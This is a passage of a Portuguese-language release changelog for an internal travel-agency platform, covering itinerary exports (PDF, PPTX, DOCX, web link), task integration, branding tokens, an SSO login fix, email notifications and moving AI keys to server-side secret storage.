- Clica numa dica → faz **SNAPSHOT** do conteúdo atual e anexa ao roteiro
- Snapshot fica em `embeddedTips[]` do doc do roteiro (não é live)
- Cliente recebe PDF/PPTX/link com versão **estável** da dica
- Botão **↻ Re-publicar** atualiza o snapshot com versão atual do Portal
- Badge **"⚠ versão mais recente disponível"** aparece quando Portal foi
  editado depois do snapshot (detecção on-render comparando updatedAt)

### Schema
```
roteiro.embeddedTips: [
  { id, tipId, title, subtitle, snapshotAt,
    content: { city, country, continent, segments, updatedAtSnapshot } }
]
```

### Service helpers (`js/services/roteiros.js`)
- `snapshotTipForEmbed(tipId)` — busca dica atual + monta snapshot
- `isEmbeddedTipStale(embedded)` — compara updatedAt do snapshot vs live
- `migrateRoteiroOnRead` agora garante `embeddedTips: []` em docs antigos

### Editor (`js/pages/roteiroEditor.js`)
- Nova seção 11 "Dicas anexas" (antes de Avançado)
- 3 handlers: `open-tip-picker`, `republish-tip`, `remove-tip`
- Modal picker reusa visual do image picker (mesma classe CSS)
- Auto-check de stale em background (queueMicrotask, não bloqueia UX)

### Render em exports
- **PDF** (`roteiroGenerator.js` → `buildEmbeddedTipsSection`): nova seção
  "DICAS LOCAIS" após informações importantes, antes do closing page.
  Cada dica vira sub-seção com label + items (place_list ou simple_list).
- **Web view** (`roteiro-view.html`): nova seção "Dicas Locais" com cards
  por dica, segments agrupados, navegação sticky atualizada.
- **PPTX**: defer pro Sprint 4 (polish de exports).

### Defense-in-depth
- `stripInternalFields` em generator + `stripInternalForPublicLink` em
  createWebLink JÁ preservam embeddedTips (não estão na lista de strip).
  Dicas embedded são conteúdo de cliente, portanto vão pro export ✓

### Next (Sprint 4)
Integração com módulo de tarefas: roteiro aprovado → gera tarefas
operacionais (reservar voo, confirmar hotel, emitir voucher).

---

## [4.43.0+20260518-roteiros-sprint4-tasks-integration] — 2026-05-18

Release **MINOR** — Sprint 4 do refactor de Roteiros: integração com módulo
de tarefas. Roteiro aprovado em modo "via sistema" gera tarefas operacionais
automaticamente, com idempotência via IDs determinísticos.

### Pedido do user
> "sprint 4"
> (após Sprint 3 entregue: Portal de Dicas embed com snapshot)

### Comportamento
1. User salva roteiro com `status='approved'` (primeira vez) e
   `workflowMode='system'` (default)
2. Sistema mostra confirmação: "Gerar N tarefas operacionais agora?"
3. Se sim → cria N tasks no Firestore via `createTask` com IDs
   determinísticos `roteiro-{roteiroId}-{operation}-{suffix?}`
4. Roteiro atualizado com `linkedTaskIds[]` + `tasksGeneratedAt`
5. Tasks renderizadas na subseção "🔗 Tarefas vinculadas" da aba Avançado
6. Listagem `/roteiros` mostra badge "🔗 N" ao lado do título

### Template operacional gerado
| Operação | Quantidade | Deadline (dias antes do início) | Prioridade |
|---|---|---|---|
| Reservar voos | 1 | 14 | high |
| Confirmar hotel | 1 por hotel do roteiro | 14 | high |
| Organizar transfers | 1 (se houver destinos) | 10 | medium |
| Contratar seguro viagem | 1 | 7 | medium |
| Enviar materiais ao cliente | 1 | 7 | medium |
| Emitir vouchers | 1 | 3 | high |

Tasks ficam com:
- `tags: ['roteiro', 'operacional']`
- `customFields.roteiroId` (back-link bidirecional)
- `customFields.roteiroOperation` (tipo: voos/hotel/transfers/etc)
- `assignees`: `consultantId` + `collaboratorIds[]` (do Sprint 2)

### Idempotência
IDs determinísticos garantem que re-gerar nunca duplica.
- 1ª geração: cria N tasks
- 2ª geração (botão "Re-sincronizar"): cria 0, retorna N existentes
- Se user editou status/subtasks/comentários nas tasks, isso é preservado

### workflowMode='offline'
Se user escolheu offline na seção Avançado (Sprint 2), `generateOperationalTasksForRoteiro`
retorna sem fazer nada (`skippedReason: 'workflow-offline'`). Toast: "Modo offline
— tarefas não foram geradas".

### Arquivos
- **`js/services/roteiroTasks.js`** (novo, ~300 linhas):
  `generateOperationalTasksForRoteiro`, `fetchLinkedTasksLite`,
  `calcLinkedTasksProgress`
- **`js/services/roteiros.js`**: emptyRoteiro ganha `linkedTaskIds: []` +
  `tasksGeneratedAt: null`. Migration on-read defensiva.
- **`js/pages/roteiroEditor.js`**:
  - `handleSave` captura `prevStatus` e dispara `maybeOfferTaskGeneration`
    se transição draft/review→approved + workflowMode='system' + sem
    tasksGeneratedAt
  - Nova subseção "🔗 Tarefas vinculadas" em Avançado com lista async
    populada por `populateLinkedTasksList`
  - Progresso visual (% done) + badges de status coloridas + ícone por
    operação + flag de overdue
  - Handlers `generate-tasks` (manual) + `regenerate-tasks` (sync)
- **`js/pages/roteiros.js`**: badge `🔗 N` ao lado do título quando
  `linkedTaskIds.length > 0`

### Defense-in-depth
- `stripInternalFields` em PDF/PPT já remove `linkedTaskIds` + `workflowMode`
  + `tasksGeneratedAt` (são internals — cliente não vê)
- `stripInternalForPublicLink` no createWebLink idem

### Next (Sprint 5+)
- Decision pending: Salesforce two-way integration?
- Ou polish de exports (PPTX richer, multi-marca refinada)?
- Ou catálogo reutilizável (módulo separado que abastece roteiros)?

---

## [4.46.0+20260518-sprint5-phase3-docx] — 2026-05-18

Release **MINOR** — Sprint 5 Phase 3: export DOCX (Word) ativado pra
roteiros. Conclui o objetivo do Sprint 5 (paridade c/ Portal de Dicas):
agora todos os 4 formatos disponíveis.

### Pattern reusado do Portal

`portalGenerator.js > generateDocx()` foi a referência. Reusos:
- `loadDocx()` (lazy import lib `docx@8.5.0`)
- Estrutura `Document → sections → children` (Paragraph + Table)
- Helpers `tr/p/hdr/sub/body/cell/headerCell` simplificam ruído visual

### Nova função `generateRoteiroDOCX(roteiro, area)`

Estrutura (sem page breaks fortes — é "editável"):
1. Capa: BU + título do roteiro + cliente + destinos + período + data
2. Dia a dia: header por dia + narrative + activities indentadas
3. Hospedagem: tabela cidade × hotel × quarto × regime × noites
4. Valores: pricing + customRows + disclaimer
5. Serviços opcionais: tabela serviço × adulto × criança × notas
6. Inclui / Não inclui: 2 listas com bullets ✓ / ✗
7. Pagamento: depósito, parcelamento, prazo, observações
8. Cancelamento: tabela antecedência × penalidade
9. Informações importantes: passaporte, visto, vacinas, etc + customFields
10. Dicas locais: 1 seção por dica embedded, máx 10 items por segmento
11. Closing: "Boa viagem!" + assinatura BU

### Wrapper único agora completo
```js
generateRoteiro({ format }) → switch:
  case 'pdf':  ✓ generateRoteiroPDF()
  case 'pptx': ✓ generateRoteiroPPTX()       (paridade c/ PDF — Phase 1+2)
  case 'docx': ✓ generateRoteiroDOCX()       ← Phase 3 (ESTA RELEASE)
  case 'web':  ✓ createWebLink() via UI      (Phase 4 — release anterior)
```

### Botão no editor
Seção Preview & Export ganha "Exportar DOCX" entre PPTX e Gerar Link.
Handler `export-docx` espelha `export-pptx` mas chama wrapper unificado
`generateRoteiro({ format: 'docx' })`.

### Defensive privacy mantido
`stripInternalFields` aplicado pelo wrapper antes de delegar — costPricing
zerado, collaboratorIds/workflowMode/linkedTaskIds removidos. Cliente
recebe DOCX puro pra editar, sem internals expostos.

### Sprint 5 fechado

5 fases entregues em 3 releases:
- 4.44.0 (Phase 1+2): wrapper único + PPTX paridade c/ PDF
- 4.45.0 (Phase 4): link web público ativado
- 4.46.0 (Phase 3): DOCX export

Phase 5 (email delivery via Microsoft Graph) FICA pra um próximo sprint
dedicado — exige Cloud Function nova, escopo maior.

### Próximos passos (decisão do user)
- Salesforce two-way (deferred desde Sprint 0)
- Email delivery do roteiro
- Catálogo reutilizável (módulo separado)
- Outra direção

---

## [4.45.0+20260518-sprint5-phase4-weblink-activated] — 2026-05-18

Release **MINOR** — Sprint 5 Phase 4: link web público ativado no editor
de Roteiros (era "em breve" desde Sprint 4).

### Comportamento
- Editor → botão "Gerar Link Web" agora **funcional** (não mostra mais
  toast "em breve")
- Bank guard preservado: clientes de bancos parceiros veem alerta antes
- Click no botão (sem bank guard) → `doGenerateWebLink()`:
  1. Salva roteiro se dirty
  2. Valida que tem `days[].length > 0` + `areaId`
  3. Chama `createWebLink()` que faz snapshot defensivo (Sprint 2/4 já
     stripped: costPricing zerado, collaboratorIds/workflowMode/aiPrompt/
     linkedTaskIds/tasksGeneratedAt removidos)
  4. Constrói URL `{baseUrl}roteiro-view.html#{token}`
  5. Mostra modal com UI igual ao Portal de Dicas: URL + Abrir + Copiar
     + token visível (debug/suporte) + nome do roteiro

### UX do modal (espelha Portal)
- Header com 🔗 + título + disclaimer sobre privacidade
- Input readonly com URL + click-to-select
- 3 botões: Abrir (target=_blank), Copiar (clipboard API + fallback
  document.execCommand), Fechar
- Footer com token + título do roteiro
- Click no backdrop fecha modal (UX padrão)

### Privacy preservada
`createWebLink` chama `stripInternalForPublicLink` ANTES de gravar no
snapshot da sub-collection `roteiro_web_links`:
- ✓ costPricing zerado
- ✓ collaboratorIds removido
- ✓ workflowMode removido
- ✓ aiPrompt/aiSources/aiProvider/aiModel removidos
- ✓ linkedTaskIds + tasksGeneratedAt removidos (Sprint 4 hardening)

Cliente recebe apenas dados destinados a ele.

### Aprendido do Portal
- Modal de URL + Copy + Open pattern (portalTipsList.js linha 920+)
- Token UUID 16-char via `crypto.randomUUID().replace(/-/g, '').slice(0, 16)`
- Sub-collection separada (`roteiro_web_links/{token}`) — read público,
  write restrito (Sprint 1 rule hardening)

### Phase 3 (DOCX) ainda pendente
Foco foi atalhar o caminho cliente-facing mais impactante (link público
funcional). DOCX (lib `docx@8.5.0`) entra na próxima release.

---

## [4.44.0+20260518-sprint5-pptx-parity-wrapper] — 2026-05-18

Release **MINOR** — Sprint 5 (Phase 1+2) do refactor de Roteiros: paridade
de PPTX com PDF + wrapper único de export espelhando padrão maduro do
Portal de Dicas (`generateTip({ format })`).

### Pedido do user
> "acho importante já olhar para exportação em multiplos formatos"
> "aprenda com o que foi feito em portal de dicas. ja esta bastante maduro."

### Audit prévio
PPTX estava 50% incompleto — só renderizava 5 das 10 seções do PDF.
Cliente recebia deck "vazado" sem Opcionais, Pagamento, Cancelamento,
Info Importantes, e Dicas anexas (Sprint 3 deferido).

### Phase 1: Wrapper único `generateRoteiro({ format })`

Espelha `generateTip({ format })` do Portal — mesmo padrão de dispatch:
```js
generateRoteiro({ roteiro, area, format }) → switch case:
  case 'pdf':  → generateRoteiroPDF()
  case 'pptx': → generateRoteiroPPTX()
  case 'docx': → throw (Phase 3 — em desenvolvimento)
  case 'web':  → throw (Phase 4 — em desenvolvimento)
```
Strip defensivo `stripInternalFields` aplicado ANTES de delegar — custo
interno, workflowMode, linkedTaskIds nunca aparecem em export pra cliente.

### Phase 2: PPTX paridade com PDF

5 novos slides adicionados ANTES do closing slide:

1. **OPCIONAIS**: tabela com serviço × preço adulto/criança × observações
2. **PAGAMENTO**: depósito, parcelamento, prazo, observações em layout
   label+value vertical
3. **CANCELAMENTO**: tabela antecedência × penalidade
4. **INFORMAÇÕES IMPORTANTES**: layout 2 colunas alternadas (passaporte,
   visto, vacinas, clima, bagagem, voos + customFields)
5. **DICAS LOCAIS** (Sprint 3 deferred): 1 slide por dica anexada, com
   título + subtitle + até 4 segmentos × 5 items cada

Todos os slides usam header bar com cor `secondary` da área (multi-marca
preservado). Layout consistente com slides existentes.

### Aprendizado do Portal de Dicas

Padrões observados em `portalGenerator.js` (2200 linhas):
- **Wrapper único** com switch de format
- **Lazy loading** de libs via `window[key]` check
- **Helpers compartilhados**: `fetchImgData`, `compositeLogoOnBackground`
- **`portalTokens.js`** centraliza branding (cores + PDF_TOKENS mm)
- **Web link**: snapshot em sub-collection + token UUID + Cloud Function
  pra OG tags
- **Fontes embedded** (Poppins base64) — zero dependência CDN

Sprint 5 Phase 1+2 reusou o pattern de wrapper. Phases 3+4 (DOCX e link
web ativado) vão reusar `fetchImgData`, lazy loaders e o token system.

### Próximas phases (planejadas)
- **Phase 3 (4.45.0)**: DOCX via lib `docx@8.5.0` já no Portal
- **Phase 4 (4.45.0)**: Link web público ativado (botão + modal + QR)
- **Phase 5 (4.46.0)**: Email delivery via Microsoft Graph

---

## [4.48.0+20260518-sprint6bc-area-tokens-sso] — 2026-05-18

Release **MINOR** — Sprint 6b+c: templates de áreas evoluídos como SSO de
identidade editorial. Resolve pedido do user:

> "vamos ter que trabalhar com bastante racional nessa parte, pra criar
> uma área de templates de areas que abasteça esses módulos de forma
> consistente, editável e escalável"

### Schema `portal_areas` expandido (backward-compatible)

```js
portal_areas/{id} = {
  // legacy (mantido)
  name, logoUrl, logoUrlAlt, colors: { primary, secondary },

  // 4.48.0+ NEW
  fonts: {
    headline:    'Poppins'|'Cormorant Garamond'|'Playfair'|'Inter'|...,
    body:        'Poppins'|'Inter'|'Outfit'|...,
    accentScale: 'compact'|'normal'|'expressive',
  },
  editorial: {
    voice:        'formal'|'caloroso'|'editorial-luxo',
    sectionStyle: 'minimalista'|'revista'|'documento',
    coverStyle:   'fullbleed'|'centered'|'side-image',
    chromeAccent: 'white'|'gold-on-dark'|'primary',  // cor overlines/lines no hero
  },
  modules: {
    portal:   { /* overrides Portal de Dicas */ },
    roteiros: { /* overrides Roteiros */ },
  },
}
```

### Novo `js/services/areaTokens.js` — SSO

- `resolveAreaTokens(area, moduleKey)` — merge defaults + module overrides
- `applyAreaTheme(area, moduleKey)` — injeta CSS vars no `<html>`:
  - `--area-primary/secondary` (+ `-rgb` para alpha)
  - `--area-font-headline/body` (auto-load Google Fonts)
  - `--area-chrome-accent` (white/gold/primary)
  - Compat legacy: `--portal-primary/secondary`
- Catálogos: `SUPPORTED_HEADLINE_FONTS` (6 opções), `SUPPORTED_BODY_FONTS` (5)

### UI `/portal-areas` reorganizada com tabs

Modal de área agora tem 4 abas:
1. **🎨 Marca** — campos legacy (nome, categoria, logos, cores, descrição)
2. **🔤 Tipografia** — headline + body (dropdown c/ 6+5 opções) + escala +
   preview LIVE da fonte selecionada (auto-load Google Fonts on change)
3. **📝 Editorial** — voice/sectionStyle/coverStyle/chromeAccent como
   radios grandes c/ descrição
4. **⚙ Por módulo** — overrides específicos pra Portal/Roteiros (accordion
   collapsible; vazio = herda defaults)

### Consumers wired

- **`portal-view.html`**: importa `applyAreaTheme`, chama com
  `moduleKey: 'portal'` — honra overrides do Portal de Dicas
- **`roteiro-view.html`**: lazy-import + `moduleKey: 'roteiros'`. Substitui
  hack legacy de `setProperty('--gold', area.colors.primary)` (que
  pintava chrome do hero de azul quando primary era azul).
- **CSS roteiro**: `body{font-family:var(--area-font-body)}`,
  `h1/h2/h3{font-family:var(--area-font-headline)}`, `.hero-overline{color:var(--area-chrome-accent)}`
  com fallback Poppins. Mudança em uma área → renderiza em TODOS formatos.

### Decoupling de identidade vs chrome

ANTES: overline/lines no hero usavam `var(--gold)` que era sobrescrito por
`area.colors.primary` via `setProperty`. BU com primary azul-marinho
deixava overline ilegível no hero escuro.

AGORA: chrome do hero (overlines, lines decorativas) usa
`--area-chrome-accent` (default `#fff`) — independente da brand color.
Brand color continua aplicada em CTAs, badges e detalhes onde faz sentido.

### Próximos passos (futuros)

- PDF/PPTX/DOCX generators consumirem `fonts.headline/body` via PDF_TOKENS
  (já preparado em portalTokens — só plumar)
- Editorial `sectionStyle` afetando layout (minimalista vs revista vs documento)
- Editorial `voice` aplicado em micro-copy (CTAs, mensagens)

---

## [4.41.0+20260518-roteiros-sprint2-schema-evolution] — 2026-05-18

Release **MINOR** — Sprint 2 do refactor de Roteiros: schema evolution
+ permissão dedicada pra custo interno + defense-in-depth contra vazamento
de margem comercial.

### Pedido do user
> "sprint 2"
> (após aprovar plano: travelers[], collaboratorIds, workflowMode, costPricing)

### 1. Schema additions (backward compat)

`emptyRoteiro()` agora retorna:
```
{
  ...campos existentes,
  collaboratorIds: [],           // ← novo
  workflowMode: 'system',        // ← novo (system|offline)
  client: { ...legacy, adults/children/childrenAges DEPRECATED },
  travelers: [                   // ← novo (responsável + acompanhantes)
    { id, name, age, isLead, doc, notes }
  ],
  costPricing: {                 // ← novo (custo interno, 🔒)
    perPerson, perCouple, currency, notes, customRows[]
  }
}
```

**Migrations on-read** em `fetchRoteiro` / `fetchRoteiros`:
- Deriva `travelers[]` automaticamente de `client.{adults,children,childrenAges}`
  se ausente. Idempotente, defensivo, lazy.
- Garante shapes mínimos pros novos campos em docs antigos.

### 2. UI — Editor de Roteiros

**Seção Cliente** (antiga): adults/children/childrenAges substituídos por
tabela `travelers[]` com nome + idade + doc + papel (Responsável) + notas.
Inputs legacy mantidos como hidden pra sincronização retroativa.

**Nova seção "Avançado"** (12ª aba, ⚙):
- **Colaboradores**: pills clicáveis pra adicionar/remover usuários que
  podem editar este roteiro (popula `collaboratorIds[]` — já reconhecido
  pelo firestore.rules do Sprint 1).
- **Modo de fluxo**: radio system/offline. Permite ao user escolher se
  segue o workflow no sistema ou fora dele (planilhas/email).
- **Custo interno** (margem): só renderiza pra usuários com permission
  `roteiro_view_cost`. Não-autorizados veem placeholder explicando.

### 3. RBAC nova permission `roteiro_view_cost`

- Concedida por default a: **master, admin**.
- Negada: manager, member, parceiro.
- Independente de `roteiro_manage` — pode ser dada a coordenadores
  comerciais sem dar admin total do módulo.

### 4. Defense-in-depth pra custo interno

Custo NUNCA vaza pra cliente. 3 camadas:
- **Layer 1 (firestore.rules)**: já restrito por ownership do Sprint 1.
- **Layer 2 (`stripInternalFields` em roteiroGenerator.js)**: aplicado em
  generateRoteiroForExport antes de PDF/PPTX rendering — costPricing
  zerado + collaboratorIds/workflowMode/aiPrompt removidos.
- **Layer 3 (`stripInternalForPublicLink` em createWebLink)**: aplicado no
  snapshot que vai pra coleção `roteiro_web_links` (read público). Mesmo
  se token vazar, custo não aparece.

### 5. sanitizeForSave estendido

Sprint 1 `sanitizeForSave()` ganha sanitização dos novos campos:
- travelers: filtra entradas totalmente vazias, garante exatamente 1 lead
- costPricing: clamp negativos a 0, filtra customRows vazias
- collaboratorIds: dedupe + remove self (consultantId redundante)

### Next (Sprint 3)
Portal de Dicas embed: anexar dicas ao roteiro com snapshot por padrão +
opção "re-publicar" pra atualizar com versão atual da dica.

---

## [4.40.27+20260518-sso-fix-mfa-prompt-conflict] — 2026-05-18

Release **PATCH** — Segunda regressão SSO Microsoft pós-audit resolvida.

### Pedido do user
> "usuario relatando que agora o sistema abre o pop up novamente, insere o
> email, a senha, mas o authenticator nao é acionado. o sistema fica em
> looping e volta pra tela de login. pode dar um double check em tudo?"

### Causa
`js/firebase.js` tinha `prompt: 'login'` + `login_hint: ''` em
`microsoftProvider.setCustomParameters` (herdado de tentativa antiga de
"evitar PIN do Authenticator"). Em tenants Primetour com Conditional Access
**exigindo MFA**, esse parâmetro força re-autenticação completa que conflita
com a política — MS rejeita silenciosamente quando não consegue satisfazer
MFA via re-auth forçada, popup fecha com `auth/popup-closed-by-user`
(silenciado em `login.js`) e user volta pra tela de login num loop.

### Fix
- `js/firebase.js`: removidos `prompt: 'login'` e `login_hint: ''`. Deixa o
  tenant aplicar o fluxo padrão (email → senha → Authenticator).
- `docs/SECURITY-FOLLOWUPS.md`: nova ARMADILHA #2 documentada (manter junto
  da #1 — `firebaseapp.com/*` em allowed-referrers).

### Validação
- Build local OK, cache-bust bumpado.
- Para validar em prod: logout → login SSO → confirmar que Authenticator
  é acionado normalmente após senha.

---

## [4.35.26+20260512-email-notifs-template-trigger] — 2026-05-12

Release **MINOR** — Notificações por email com opt-in granular e identidade
unificada.

### Pedido do user
> "agora que liberamos o email outlook, precisamos voltar a falar sobre
> notificações por email, certo? gostaria de fazer isso em notificacoes,
> para o user configurar o que quer receber por email. precisamos, também,
> preparar os emails disso tudo em uma mesma identidade (csat é boa
> referencia). opcao A pacote completo"

### 1. Email Template DSL — `functions/emailTemplate.js`
- `renderEmailTemplate({ preheader, overline, heading, intro, blocks, cta, footerNote, variant, productLabel })`
- Identidade visual única baseada no CSAT (navy #0F172A + dourado #D4A843 + logo PRIMETOUR branco).
- Variantes de cor: `default` / `success` / `warning` / `danger` afetam a borda inferior do header.
- Tipos de blocks: `paragraph`, `list`, `data` (label-valor), `highlight` (navy destacado),
  `quote` (borda esquerda), `divider`.
- Helper `buildNotificationEmail(notif)` monta email a partir de um doc de notif.
- `NOTIF_TYPE_META` mapeia cada tipo → overline + variant + label do CTA.
- `_buildSystemFeedbackEmailHtml()` refatorado pra usar o helper (era 35 linhas inline, agora 18).

### 2. Cloud Function `onNotificationCreate` (Firestore trigger)
- Trigger em `notifications/{notifId}`.
- Lê `users/{recipientId}.prefs.emailNotifications`.
- Só envia se `enabled === true` AND `types[type] === true`.
- Rate-limit: max 20 emails/h por user (anti-spam).
- Renderiza email via `buildNotificationEmail()` + envia via Microsoft Graph.
- Marca `emailSentAt` no doc da notif após sucesso.
- Falha de email não bloqueia: notif in-app continua existindo.
- Deployed: ✓.

### 3. Service `js/services/emailPrefs.js`
- `getEmailPrefs()` → lê preferências do user logado.
- `saveEmailPrefs({ enabled, types })` → grava em `users/{uid}.prefs.emailNotifications`.
- `DEFAULT_EMAIL_TYPES`: conjunto conservador (taskAssigned, taskOverdue, mention, csatResponded, lowScore).
- `EMAIL_TYPE_GROUPS`: 9 categorias com 30+ tipos cobertos (Tarefas, Projetos & Squads,
  CSAT, Metas, Solicitações, Menções, Feedbacks, Conteúdo & Roteiros, Sistema & IA).

### 4. UI — aba "Notificações por email" em `/notifications`
- Página `/notifications` agora tem duas abas: **🔔 Inbox** | **✉ Notificações por email**.
- Toggle master "Receber notificações por email" + lista agrupada por categoria.
- Cada tipo tem nome + hint (1 linha explicando quando dispara).
- Por categoria: contador "X de Y ativos" + botão "Marcar todos / Desmarcar todos / Marcar restantes".
- Botão "↻ Restaurar padrão" volta aos 5 defaults conservadores.
- Barra "Salvar alterações / Descartar" sticky no fim da página, só aparece quando dirty.
- Quando master desligado, lista fica opaca + sem interação.

### 5. Firestore Rules
- `users/{uid}` já permite self-update em `prefs.*` (não está na whitelist sensível).
  Nenhuma mudança em rules necessária.

### Bump
- `4.35.26+20260512-email-notifs-template-trigger`
- Cloud Functions deployadas: `onNotificationCreate` (novo) + `onSystemFeedbackCreate` (refatorado).
- `app.js` imports bumped `v=20260512oo3` → `v=20260512oo4` pra invalidar cache.

---

## [4.35.25+20260512-ai-hub-secrets-all-server-side] — 2026-05-12

Release **PATCH** — IA Hub: todos os providers agora 100% server-side; aba
Migração removida.

### Pedido do user
> "migracao: nao é melhor excluir, já que concluiu? api keys: não é melhor já
> levar tudo pro banco de dados [Secret Manager] e, quando for inserir outras
> API keys, a config já leva pro banco de dados e, ao configurar, volta com o
> aviso positivo?"

### Aba Migração — removida
- Migração legada (ai_skills/ai_automations → ai_agents) já concluída e idempotente.
- Aba removida do tab list (era visualmente confusa mesmo escondida em `<details>`).
- Funções continuam acessíveis via console pra emergência: `seedDefaultAgents`,
  `migrateLegacyToAgents`, `purgeLegacyCollections`.

### Aba API Keys — totalmente refatorada (Secret Manager-first)
- Nova Cloud Function `getAISecretsStatus` retorna quais secrets de provider
  estão configurados (sem expor o valor). Lê via `defineSecret().value()`.
- UI agora lista os 4 providers (Anthropic/OpenAI/Gemini/Groq) com status real
  do Secret Manager — não mais Firestore.
- Coluna mostra:
  - `✓ Configurada` em verde + tamanho real da key
  - `— Não configurada` em cinza + botão "+ Configurar"
- Modal de configuração com instruções passo-a-passo:
  1. `firebase functions:secrets:set NOME_KEY` (com botão "Copiar")
  2. `firebase deploy --only functions:callLLM` (com botão "Copiar")
  3. Voltar e clicar "↻ Verificar status"
- Botão "↻ Verificar status" re-consulta o Cloud Function sem reload.
- Modal mostra link pra obter a key (OpenAI, Gemini Studio, Groq Console).
- Configurações legadas (system_config/ai-config + ai_api_keys) ficam num
  `<details>` colapsado com aviso "não usadas em runtime" + botão pra apagar.

### Bump
- `4.35.25+20260512-ai-hub-secrets-all-server-side`
- Cloud Function `getAISecretsStatus` deployada.

---

## [4.35.24+20260511-ai-hub-revamp] — 2026-05-11

Release **PATCH** — IA Hub: revisão das 7 abas pra refletir a realidade
pós-Secret-Manager + cálculo de custo cache-aware.

### Pedido do user
> "IA hub merece revisao... pq temos a aba API Keys se é tudo via firestore?
> do jeito q esta parece q a gente configura via sistema. conhecimento nao
> está atrelado à config do agente? pq tem aba pra isso? logs estao corretos?
> custos estao corretos? migracao? pra que serve hoje em dia?"

### API Keys
- Banner verde no topo: "🔐 Anthropic agora é server-side" + caminho de
  rotação via `firebase functions:secrets:set ANTHROPIC_API_KEY`.
- Linha do Anthropic na tabela vira read-only ("✓ Secret Manager · server-side").
- Footnote: "Próximo passo: migrar OpenAI/Gemini/Groq também pro Secret Manager".

### Custos (cálculo cache-aware)
- `estimateCost()` agora aceita `{ cacheReadTokens, cacheCreationTokens }`.
  Cache read = 10% do input, cache creation = 125%. Antes os custos eram
  superestimados pra agentes com prompt caching.
- Novo KPI "Tokens cache (read)" mostra tokens reutilizados + economia em USD.
- Tabela "Top agentes" ganhou coluna "Cache ↓" (tokens economizados por agente).

### Biblioteca (ex-Conhecimento)
- Aba renomeada de "Conhecimento" pra "Biblioteca" pra deixar claro que é
  pool compartilhado.
- Banner no topo: "📚 Biblioteca compartilhada — docs reutilizáveis por
  múltiplos agentes... Fontes externas (SharePoint, GDrive, GitHub) ficam
  no editor do agente, não aqui".

### Migração (auto-detecta status)
- Sonda contagem de `ai_skills` e `ai_automations`. Se ambos zerados,
  mostra card "✓ Migração concluída" com ações avançadas escondidas em
  `<details>`. Se ainda há legado, mostra fluxo completo + contadores.
- Helpers extraídos: `_legacyMigrationButtonsHtml` + `_bindLegacyMigrationButtons`.

### Conexões
- Aviso de dívida técnica: SharePoint `clientSecret` ainda em Firestore;
  próximo passo é mover pro Secret Manager.

### Bump
- `4.35.24+20260511-ai-hub-revamp` em `js/version.js` + `index.html`.

---

## [4.35.23+20260511-anthropic-server-side-vision-web] — 2026-05-11

Release **PATCH** — IA Hub: Anthropic em produção via Cloud Function, vision e
web search nativo.

### Pedido do user
> "secret key Claude API: sk-ant-... faça tudo para deixar esse módulo
> exemplar e com alto requisito técnico."

### Segurança — key fora do browser
- Key Anthropic agora vive no **Secret Manager do GCP**
  (`firebase functions:secrets:set ANTHROPIC_API_KEY`).
- `callLLM` (Cloud Function v2 onCall) é o único caminho — browser nunca vê a key.
- Removido `anthropic-dangerous-direct-browser-access: true` do caminho produtivo
  (`js/services/ai.js` `callAnthropic` agora chama `callLLM` via `httpsCallable`).
- Smoke test (`functions/test-anthropic-smoke.cjs`) valida ponta-a-ponta:
  Secret Manager → API → resposta texto + busca nativa.

### Vision multimodal
- Cloud Function `callAnthropic` aceita `attachments` (image blocks ou
  data-URI base64) e monta `content` como array `[image, text]`.
- `callLLMSecure` + `runAgent` propagam `context.attachments` até a Cloud Function.

### Web search nativo Anthropic
- Tool `web_search_20250305` habilitada via flag `webSearch` no payload.
- Quando `agent.allowWebSearch===true` e `provider==='anthropic'` (ou gemini),
  o pre-fetch Serper antigo é **pulado** — o modelo decide buscar sozinho com
  citações automáticas. Demais providers continuam com Serper-prefetch.

### Guards / DX
- `resolveApiKey` agora ignora a checagem de key local quando `provider==='anthropic'`
  tanto no `executeSkill` quanto no caminho `chatWithAI` e no `runAgent`.
- Mensagem de "API key não configurada" não dispara mais pra anthropic.
- Bump version → `4.35.23` (build `20260511-anthropic-server-side-vision-web`).

### Testado
- Smoke text: "Brasília" (20 in / 6 out tokens).
- Smoke web search: dólar do dia retornado com 1 search (9588 in / 119 out).
- Cloud Function deployada (`firebase deploy --only functions:callLLM`).

---

## [4.35.3+20260509-system-feedback-module] — 2026-05-09

Release **MINOR** — Módulo System Feedback com email automático via Microsoft Graph.

### Pedido do user
> "em governança você fala sobre o usuario enviar feedback. onde está isso?
> agora com o email outlook 365 rodando, conseguimos fazer isso sem problemas.
> vale montar o módulo"

### Mudança
O sistema referenciava "Feedback no menu" na Governança mas não existia módulo
pra coletar feedback **sobre o sistema**. O `/feedbacks` atual é gestão de pessoas
(manager → subordinado), não bug/sugestão.

Módulo novo construído end-to-end:

| Componente | Descrição |
|---|---|
| `js/services/systemFeedback.js` | CRUD da coleção, tipos (bug/sugestão/dúvida/elogio), status (novo/análise/desenvolvimento/resolvido/rejeitado) |
| `js/components/systemFeedbackModal.js` | Modal compartilhado (cards de tipo + textarea + char counter) |
| `js/pages/systemFeedback.js` | Página admin com KPIs, filtros, cards, modal de detalhe + resposta interna |
| `functions/index.js` | Firestore trigger v2 `onSystemFeedbackCreate` (1ª no projeto, exigiu Eventarc Service Agent) → email via Microsoft Graph |
| `firestore.rules` | Auth cria próprio, admin lê/edita, master deleta |
| `js/auth/audit.js` | 3 actions: `system_feedback.create/update/delete` |

### Acesso
- **Usuário**: botão "💬 Enviar sugestão" no TOC sidebar da Governança
- **Admin**: sidebar Administração → "Feedbacks do Sistema" (acima de Configurações)
- **Email destino**: rene.castro@primetour.com.br (template HTML com header navy + tipo destacado + metadata)

### Testado
- Smoke test via script: doc criado, log da function confirma `email enviado`
- UI test via Chrome: fluxo modal → Firestore → Cloud Function → Graph completo

---

## [4.35.2+20260509-dev-hours-summary-expand] — 2026-05-09

Release **PATCH** — Botão "Ver mais" pra ver descrições truncadas em dev_hours.

### Pedido do user
> "tem várias descrições de trabalho que estão com ... e isso nao pode ser
> visto em nenhum lugar. faça algo que permita ver o texto completo"

### Mudança
Em `dev-hours-view.html`: descrições > 180 chars eram cortadas com `…` mas não
havia como ver o texto completo. Agora cada entrada com summary longo tem
botão **Ver mais** dourado que alterna entre versão truncada e completa
inline. Click handler bound após cada render do tbody.

---

## [4.35.1+20260509-hours-hhmm-format] — 2026-05-09

Release **PATCH** — Formato HH:MM em horas de desenvolvimento (em vez de decimal).

### Pedido do user
> "transforme para o padrao de hora (hoje, parece que está de 0 a 100 pra
> formar uma hora)"

### Mudança
`fmtH(6.67)` retornava `"6.67h"` — confundia com base 100. Trocado por
formato real:

| Antes | Depois |
|---|---|
| `6.67h` | `6h 40min` |
| `4.5h`  | `4h 30min` |
